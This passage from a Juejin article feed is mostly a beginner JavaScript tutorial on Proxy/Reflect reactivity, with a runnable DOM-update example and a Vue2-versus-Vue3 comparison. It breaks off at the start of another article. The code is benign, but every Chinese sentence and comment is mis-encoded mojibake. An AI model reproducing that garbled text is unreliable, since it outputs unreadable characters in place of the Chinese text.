    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`æœ‰äººä¿®æ”¹äº† <span class="hljs-subst">${property}</span> å±æ€§ï¼Œæ–°å€¼æ˜¯ <span class="hljs-subst">${value}</span>`</span>);
    <span class="hljs-comment">// ç”¨ Reflect.set ä»£æ›¿ target[property] = value</span>
    <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">set</span>(target, property, value);
    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
  }
});
</code></pre>
<h2 data-id="heading-7">ä¸‰ã€åˆ†æ­¥å®ç°ï¼šåŸºäº Proxy çš„å®Œæ•´å“åº”å¼</h2>
<p>æˆ‘ä»¬åˆ† 2 æ­¥å®ç°ï¼Œä»ç®€å•åˆ°å¤æ‚ï¼Œæ¯ä¸€æ­¥éƒ½èƒ½ç‹¬ç«‹è¿è¡Œï¼Œæ–¹ä¾¿ä½ æµ‹è¯•ç†è§£ã€‚</p>
<h3 data-id="heading-8">æ­¥éª¤ 1ï¼šå°è£…ä¸€ä¸ªåŸºç¡€çš„å“åº”å¼å‡½æ•°ï¼ˆç›‘å¬è¯»å†™ï¼‰</h3>
<p>æˆ‘ä»¬å…ˆæŠŠ Proxy çš„é€»è¾‘å°è£…æˆä¸€ä¸ªå‡½æ•°ï¼Œæ–¹ä¾¿å¤ç”¨ï¼ˆè¿™å°±æ˜¯ Vue3 ä¸­Â <code>reactive</code>Â å‡½æ•°çš„ç®€åŒ–ç‰ˆï¼‰ã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">/**
 * å°è£…å“åº”å¼å‡½æ•°ï¼šç»™æ™®é€šå¯¹è±¡è¿”å›ä¸€ä¸ªä»£ç†å¯¹è±¡
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">Object</span>} <span class="hljs-variable">obj</span> - è¦è¢«ä»£ç†çš„åŸå§‹å¯¹è±¡
 * <span class="hljs-doctag">@returns</span> {<span class="hljs-type">Proxy</span>} - ä»£ç†åçš„å“åº”å¼å¯¹è±¡
 */</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">makeReactive</span>(<span class="hljs-params">obj</span>) {
  <span class="hljs-comment">// åˆ›å»º Proxy ä»£ç†</span>
  <span class="hljs-keyword">const</span> proxyObj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(obj, {
    <span class="hljs-comment">// æ‹¦æˆªè¯»å–æ“ä½œ</span>
    <span class="hljs-title function_">get</span>(<span class="hljs-params">target, property</span>) {
      <span class="hljs-comment">// è¯»å–å±æ€§å¹¶è¿”å›</span>
      <span class="hljs-keyword">return</span> <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">get</span>(target, property);
    },
    <span class="hljs-comment">// æ‹¦æˆªä¿®æ”¹æ“ä½œ</span>
    <span class="hljs-title function_">set</span>(<span class="hljs-params">target, property, value</span>) {
      <span class="hljs-comment">// æ‰§è¡Œä¿®æ”¹æ“ä½œ</span>
      <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">set</span>(target, property, value);
      <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }
  });

  <span class="hljs-comment">// è¿”å›ä»£ç†å¯¹è±¡</span>
  <span class="hljs-keyword">return</span> proxyObj;
}
</code></pre>
<h3 data-id="heading-9">æ­¥éª¤ 2ï¼šå‡çº§ï¼šå®ç° â€œæ•°æ®å˜ â†’ é¡µé¢è‡ªåŠ¨æ›´æ–°â€</h3>
<p>å¤§å®¶æœ€å…³å¿ƒçš„æ˜¯ï¼šå¦‚ä½•è®©æ•°æ®å˜åŒ–æ—¶ï¼Œé¡µé¢ DOM è‡ªåŠ¨æ›´æ–°ï¼Ÿæˆ‘ä»¬åŸºäºä¸Šé¢çš„ä»£ç ï¼Œæ–°å¢ DOM æ›´æ–°é€»è¾‘ï¼Œæ›´è´´è¿‘å®é™…é¡¹ç›®ä½¿ç”¨ã€‚</p>
<h4 data-id="heading-10">å®Œæ•´ä»£ç ï¼ˆå¯ç›´æ¥å¤åˆ¶åˆ° HTML æ–‡ä»¶ä¸­è¿è¡Œï¼‰</h4>
<pre><code class="hljs language-html" lang="html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"zh-CN"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>æ–°æ‰‹ç‰ˆ Proxy å“åº”å¼<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">
    <span class="hljs-selector-class">.user-info</span> {
      <span class="hljs-attribute">margin</span>: <span class="hljs-number">20px</span>;
      <span class="hljs-attribute">padding</span>: <span class="hljs-number">20px</span>;
      <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid <span class="hljs-number">#ccc</span>;
    }
  </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
  <span class="hljs-comment">&lt;!-- é¡µé¢DOMï¼šè¦è‡ªåŠ¨æ›´æ–°çš„å†…å®¹ --&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"user-info"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>ç”¨æˆ·åï¼š<span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"username"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>ç­‰çº§ï¼š<span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"level"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"upgradeBtn"</span>&gt;</span>ç‚¹å‡»å‡çº§ç­‰çº§<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>

  <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
    <span class="hljs-comment">// æ­¥éª¤1ï¼šå°è£…å“åº”å¼å‡½æ•°ï¼ˆæ–°å¢ï¼šDOMæ›´æ–°é€»è¾‘ï¼‰</span>
    <span class="hljs-keyword">function</span> <span class="hljs-title function_">makeReactive</span>(<span class="hljs-params">obj</span>) {
      <span class="hljs-keyword">const</span> proxyObj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(obj, {
        <span class="hljs-title function_">get</span>(<span class="hljs-params">target, property</span>) {
          <span class="hljs-keyword">return</span> <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">get</span>(target, property);
        },
        <span class="hljs-title function_">set</span>(<span class="hljs-params">target, property, value</span>) {
          <span class="hljs-comment">// 1. å…ˆä¿®æ”¹æ•°æ®</span>
          <span class="hljs-keyword">const</span> oldValue = target[property];
          <span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">set</span>(target, property, value);

          <span class="hljs-comment">// 2. æ•°æ®ä¿®æ”¹åï¼Œè‡ªåŠ¨æ›´æ–°DOMï¼ˆæ ¸å¿ƒï¼šå“åº”å¼çš„å®é™…è½åœ°ï¼‰</span>
          <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`æ•°æ® <span class="hljs-subst">${property}</span> å˜åŒ–ï¼Œè‡ªåŠ¨æ›´æ–°é¡µé¢`</span>);
          <span class="hljs-title function_">updateDOM</span>(property, value);

          <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
        }
      });
      <span class="hljs-keyword">return</span> proxyObj;
    }

    <span class="hljs-comment">// æ­¥éª¤2ï¼šå°è£… DOM æ›´æ–°å‡½æ•°ï¼ˆæ ¹æ®æ•°æ®å˜åŒ–ï¼Œæ›´æ–°å¯¹åº”é¡µé¢å…ƒç´ ï¼‰</span>
    <span class="hljs-keyword">function</span> <span class="hljs-title function_">updateDOM</span>(<span class="hljs-params">property, value</span>) {
      <span class="hljs-keyword">if</span> (property === <span class="hljs-string">"username"</span>) {
        <span class="hljs-comment">// æ‰¾åˆ°é¡µé¢ä¸Šçš„ username å…ƒç´ ï¼Œæ›´æ–°å†…å®¹</span>
        <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">"username"</span>).<span class="hljs-property">innerText</span> = value;
      }
      <span class="hljs-keyword">if</span> (property === <span class="hljs-string">"level"</span>) {
        <span class="hljs-comment">// æ‰¾åˆ°é¡µé¢ä¸Šçš„ level å…ƒç´ ï¼Œæ›´æ–°å†…å®¹</span>
        <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">"level"</span>).<span class="hljs-property">innerText</span> = value;
      }
    }

    <span class="hljs-comment">// æ­¥éª¤3ï¼šåˆå§‹åŒ–æ•°æ®å’Œé¡µé¢</span>
    <span class="hljs-comment">// 1. åŸå§‹æ•°æ®</span>
    <span class="hljs-keyword">const</span> user = {
      <span class="hljs-attr">username</span>: <span class="hljs-string">"å‰ç«¯æ–°æ‰‹"</span>,
      <span class="hljs-attr">level</span>: <span class="hljs-number">1</span>
    };
    <span class="hljs-comment">// 2. ç”Ÿæˆå“åº”å¼å¯¹è±¡</span>
    <span class="hljs-keyword">const</span> reactiveUser = <span class="hljs-title function_">makeReactive</span>(user);
    <span class="hljs-comment">// 3. åˆå§‹åŒ–é¡µé¢ï¼ˆç¬¬ä¸€æ¬¡æ‰‹åŠ¨æ¸²æŸ“ï¼Œåç»­è‡ªåŠ¨æ›´æ–°ï¼‰</span>
    <span class="hljs-title function_">updateDOM</span>(<span class="hljs-string">"username"</span>, reactiveUser.<span class="hljs-property">username</span>);
    <span class="hljs-title function_">updateDOM</span>(<span class="hljs-string">"level"</span>, reactiveUser.<span class="hljs-property">level</span>);

    <span class="hljs-comment">// æ­¥éª¤4ï¼šç»‘å®šæŒ‰é’®ç‚¹å‡»äº‹ä»¶ï¼ˆä¿®æ”¹æ•°æ®ï¼Œæµ‹è¯•è‡ªåŠ¨æ›´æ–°ï¼‰</span>
    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">"upgradeBtn"</span>).<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">"click"</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
      <span class="hljs-comment">// åªéœ€è¦ä¿®æ”¹å“åº”å¼æ•°æ®ï¼Œé¡µé¢ä¼šè‡ªåŠ¨æ›´æ–°ï¼</span>
      reactiveUser.<span class="hljs-property">level</span> = reactiveUser.<span class="hljs-property">level</span> + <span class="hljs-number">1</span>;
      <span class="hljs-title function_">alert</span>(<span class="hljs-string">`ç­‰çº§å‡çº§æˆåŠŸï¼å½“å‰ç­‰çº§ï¼š<span class="hljs-subst">${reactiveUser.level}</span>`</span>);
    });
  </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<h4 data-id="heading-11">è¿è¡Œæ•ˆæœ</h4>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3f81af0acfd74dc3b3a252ae7056d283~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTWF4a2lt:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767619017&amp;x-signature=BvCTAWXu3jr5LimtmNvFIP%2F9YQY%3D" alt="image.png" loading="lazy"/></p>
<ol>
<li>
<p>æ‰“å¼€ HTML æ–‡ä»¶ï¼Œé¡µé¢ä¸Šä¼šæ˜¾ç¤ºç”¨æˆ·åå’Œç­‰çº§</p>
</li>
<li>
<p>ç‚¹å‡» â€œç‚¹å‡»å‡çº§ç­‰çº§â€ æŒ‰é’®</p>
</li>
<li>
<p>ä½ ä¼šå‘ç°ï¼š</p>
<ul>
<li>å¼¹çª—æç¤ºç­‰çº§å‡çº§</li>
<li>é¡µé¢ä¸Šçš„ â€œç­‰çº§â€ æ•°å­—ä¼š<strong>è‡ªåŠ¨ä» 1 å˜æˆ 2ï¼Œå†ç‚¹å‡»å˜æˆ 3...</strong></li>
<li>æˆ‘ä»¬æ²¡æœ‰æ‰‹åŠ¨å†™Â <code>document.getElementById("level").innerText = æ–°å€¼</code>ï¼Œè€Œæ˜¯æ•°æ®å˜åŒ–åè‡ªåŠ¨è§¦å‘ï¼Œè¿™å°±æ˜¯å®Œæ•´çš„å“åº”å¼æ•ˆæœï¼</li>
</ul>
</li>
</ol>
<h2 data-id="heading-12">å››ã€æ ¸å¿ƒçŸ¥è¯†ç‚¹ï¼ˆæ€»ç»“ï¼‰</h2>
<ol>
<li>
<p><strong>æ•°æ®å“åº”å¼</strong>ï¼šæ•°æ®å˜ â†’ é¡µé¢ / é€»è¾‘è‡ªåŠ¨å˜ï¼Œæ— éœ€æ‰‹åŠ¨æ“ä½œã€‚</p>
</li>
<li>
<p><strong>Proxy</strong>ï¼šç»™å¯¹è±¡åŠ  â€œæ‹¦æˆªå™¨â€ï¼Œç›‘å¬ã€Œè¯»å–ï¼ˆgetï¼‰ã€å’Œã€Œä¿®æ”¹ï¼ˆsetï¼‰ã€æ“ä½œï¼Œæ˜¯å®ç°å“åº”å¼çš„æ ¸å¿ƒã€‚</p>
</li>
<li>
<p><strong>Reflect</strong>ï¼šå’Œ Proxy æ­æ¡£ï¼Œæ›´å®‰å…¨åœ°æ“ä½œå¯¹è±¡å±æ€§ï¼ˆæ›¿ä»£Â <code>target[property]</code>Â å’ŒÂ <code>target[property] = value</code>ï¼‰ã€‚</p>
</li>
<li>
<p><strong>æ ¸å¿ƒæµç¨‹</strong>ï¼š</p>
<ul>
<li>ç”¨Â <code>makeReactive</code>Â å‡½æ•°æŠŠæ™®é€šå¯¹è±¡å˜æˆ Proxy ä»£ç†å¯¹è±¡</li>
<li>æ“ä½œä»£ç†å¯¹è±¡æ—¶ï¼Œä¼šè§¦å‘ get/set æ‹¦æˆªå™¨</li>
<li>åœ¨ set æ‹¦æˆªå™¨ä¸­ï¼Œæ•°æ®ä¿®æ”¹åè‡ªåŠ¨æ‰§è¡Œ DOM æ›´æ–°ï¼ˆæˆ–å…¶ä»–é€»è¾‘ï¼‰</li>
</ul>
</li>
<li>
<p><strong>å…³é”®æ³¨æ„ç‚¹</strong>ï¼šå¿…é¡»æ“ä½œã€ŒProxy ä»£ç†å¯¹è±¡ã€æ‰ä¼šè§¦å‘å“åº”å¼ï¼Œæ“ä½œåŸå§‹å¯¹è±¡æ— æ•ˆã€‚</p>
</li>
</ol>
<h2 data-id="heading-13">äº”ã€å¸¸è§ç–‘é—®è§£ç­”</h2>
<ol>
<li><strong>é—®ï¼šä¸ºä»€ä¹ˆä¸ç”¨ç›´æ¥ä¿®æ”¹å¯¹è±¡ï¼Œéè¦ç”¨ Proxyï¼Ÿ</strong> ç­”ï¼šç›´æ¥ä¿®æ”¹å¯¹è±¡æ— æ³• â€œç›‘å¬â€ å˜åŒ–ï¼Œæ¯”å¦‚Â <code>user.level = 2</code>ï¼Œæˆ‘ä»¬ä¸çŸ¥é“ä»€ä¹ˆæ—¶å€™æ”¹çš„ã€æ”¹äº†ä»€ä¹ˆå€¼ï¼›è€Œ Proxy èƒ½ç²¾å‡†æ•è·è¿™äº›æ“ä½œï¼Œè¿›è€Œè§¦å‘åç»­é€»è¾‘ã€‚</li>
<li><strong>é—®ï¼šè¿™å’Œ Vue3 çš„å“åº”å¼æœ‰ä»€ä¹ˆå…³ç³»ï¼Ÿ</strong> ç­”ï¼šVue3 çš„Â <code>reactive</code>Â å‡½æ•°åº•å±‚å°±æ˜¯åŸºäº Proxy å®ç°çš„ï¼Œæˆ‘ä»¬å†™çš„Â <code>makeReactive</code>Â å°±æ˜¯Â <code>reactive</code>Â çš„ç®€åŒ–ç‰ˆï¼ŒVue3 åªæ˜¯åœ¨è¿™ä¸ªåŸºç¡€ä¸Šå¢åŠ äº† â€œä¾èµ–æ”¶é›†â€ ç­‰æ›´å¤æ‚çš„é€»è¾‘ï¼ˆä¸‹ä¸€ç¯‡æ–‡ç« å¯èƒ½å°±ä¼šè®²è¿°ï¼Œå¤§å®¶å¯ä»¥å…³æ³¨æ–°çš„æ ç›®"Vueæºç è§£æ"ï¼‰ã€‚</li>
<li><strong>é—®ï¼šReflect å¿…é¡»ç”¨å—ï¼Ÿä¸ç”¨è¡Œä¸è¡Œï¼Ÿ</strong> ç­”ï¼šç®€å•åœºæ™¯ä¸‹ä¸ç”¨ä¹Ÿå¯ä»¥ï¼Œä½† Reflect èƒ½è§£å†³å¾ˆå¤šå‘ï¼ˆæ¯”å¦‚ç»§æ‰¿ã€ä¸¥æ ¼æ¨¡å¼ï¼‰ï¼Œè€Œä¸”æ˜¯ ES6 æ¨èçš„ Proxy æ­æ¡£ï¼Œæ–°æ‰‹ç›´æ¥å…»æˆä½¿ç”¨ä¹ æƒ¯å³å¯ã€‚</li>
</ol>
<h2 data-id="heading-14">å…­ã€æ‹“å±•</h2>
<p>æ—¢ç„¶éƒ½è®²åˆ°è¿™é‡Œå•¦ï¼Œé‚£å°±æµ…è°ˆvue2å’Œvue3ä¸­å…³äºæœ‰æ— Proxyçš„åŒºåˆ«å§~</p>
<h3 data-id="heading-15">1. Vue2 çš„å“åº”å¼ï¼šåŸºäºÂ <code>Object.defineProperty</code></h3>
<p>Vue2 æ˜¯é€šè¿‡Â <code>Object.defineProperty</code>Â ç»™å¯¹è±¡çš„<strong>æ¯ä¸ªå±æ€§</strong>å•ç‹¬è®¾ç½®Â <code>getter/setter</code>ï¼Œä»è€Œç›‘å¬å±æ€§çš„è¯»å†™ã€‚</p>
<p>ä½†å®ƒæœ‰å‡ ä¸ªæ˜æ˜¾çš„<strong>ç¼ºé™·</strong>ï¼š</p>
<ul>
<li>åªèƒ½ç›‘å¬<strong>å·²å­˜åœ¨çš„å±æ€§</strong>ï¼šå¦‚æœç»™å¯¹è±¡æ–°å¢å±æ€§ï¼ˆæ¯”å¦‚Â <code>obj.newKey = 1</code>ï¼‰ï¼ŒVue2 ç›‘å¬ä¸åˆ°ï¼Œå¾—ç”¨Â <code>Vue.set</code>Â æ‰‹åŠ¨è§¦å‘å“åº”ã€‚</li>
<li>æ— æ³•ç›‘å¬<strong>æ•°ç»„çš„å˜åŒ–</strong>ï¼šæ¯”å¦‚æ•°ç»„çš„Â <code>push/pop/splice</code>Â ç­‰æ–¹æ³•ï¼ŒVue2 æ˜¯é€šè¿‡ â€œé‡å†™æ•°ç»„åŸå‹æ–¹æ³•â€ çš„æ–¹å¼æ›²çº¿æ•‘å›½ï¼Œä¸å¤Ÿä¼˜é›…ã€‚</li>
<li>å¿…é¡»éå†å¯¹è±¡çš„æ‰€æœ‰å±æ€§ï¼šå¦‚æœå¯¹è±¡å±‚çº§æ·±ï¼Œéœ€è¦é€’å½’éå†ï¼Œæ€§èƒ½å¼€é”€å¤§ã€‚</li>
</ul>
<h3 data-id="heading-16">2. Vue3 çš„å“åº”å¼ï¼šåŸºäºÂ <code>Proxy</code></h3>
<p>Vue3 ç”¨Â <code>Proxy</code>Â ä»£ç†<strong>æ•´ä¸ªå¯¹è±¡</strong>ï¼Œç›´æ¥æ‹¦æˆªå¯¹è±¡çš„ã€Œæ‰€æœ‰å±æ€§æ“ä½œã€ï¼Œå®Œç¾è§£å†³äº† Vue2 çš„ç¼ºé™·ï¼š</p>
<ul>
<li>èƒ½ç›‘å¬<strong>æ–°å¢ / åˆ é™¤å±æ€§</strong>ï¼šæ¯”å¦‚Â <code>obj.newKey = 1</code>Â ä¼šè¢«Â <code>Proxy</code>Â çš„Â <code>set</code>Â æ‹¦æˆªï¼Œè‡ªåŠ¨å“åº”ã€‚</li>
<li>èƒ½åŸç”Ÿç›‘å¬<strong>æ•°ç»„å˜åŒ–</strong>ï¼šæ•°ç»„çš„Â <code>push/pop</code>Â ç­‰æ“ä½œä¼šè¢«Â <code>Proxy</code>Â æ•è·ï¼Œä¸ç”¨å†é‡å†™æ•°ç»„æ–¹æ³•ã€‚</li>
<li>ä»£ç†æ•´ä¸ªå¯¹è±¡ï¼Œæ— éœ€é€’å½’éå†ï¼š<code>Proxy</code>Â æ˜¯ä»£ç†æ•´ä¸ªå¯¹è±¡ï¼Œå±‚çº§æ·±çš„å¯¹è±¡ä¼šåœ¨<strong>è¯»å–æ—¶æ‡’ä»£ç†</strong>ï¼Œæ€§èƒ½æ›´ä¼˜ã€‚</li>
</ul>
<h3 data-id="heading-17">æ€»ç»“</h3>
<p>Vue3 ç”¨Â <code>Proxy</code>Â æ›¿ä»£ Vue2 çš„Â <code>Object.defineProperty</code>ï¼Œæœ¬è´¨æ˜¯<strong>ç”¨æ›´ç°ä»£ã€æ›´å¼ºå¤§çš„ ES6 ç‰¹æ€§ï¼Œè§£å†³äº† Vue2 å“åº”å¼çš„å„ç§ â€œç—›ç‚¹â€</strong> ~</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ç¬¬å››ç« ï¼šå¤©é“ä½æ ¼ä¸è¯¸æ³•å¥‘çº¦]]></title>    <link>https://juejin.cn/post/7589206614928982056</link>    <guid>https://juejin.cn/post/7589206614928982056</guid>    <pubDate>2025-12-30T01:48:49.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589206614928982056" data-draft-id="7589207843787210787" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ç¬¬å››ç« ï¼šå¤©é“ä½æ ¼ä¸è¯¸æ³•å¥‘çº¦"/> <meta itemprop="keywords" content="Haskell"/> <meta itemprop="datePublished" content="2025-12-30T01:48:49.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Lupino"/> <meta itemprop="url" content="https://juejin.cn/user/3051900006579256"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ç¬¬å››ç« ï¼šå¤©é“ä½æ ¼ä¸è¯¸æ³•å¥‘çº¦
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3051900006579256/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Lupino
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-30T01:48:49.000Z" title="Tue Dec 30 2025 01:48:49 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æ­å–œé“å‹ï¼ä½ 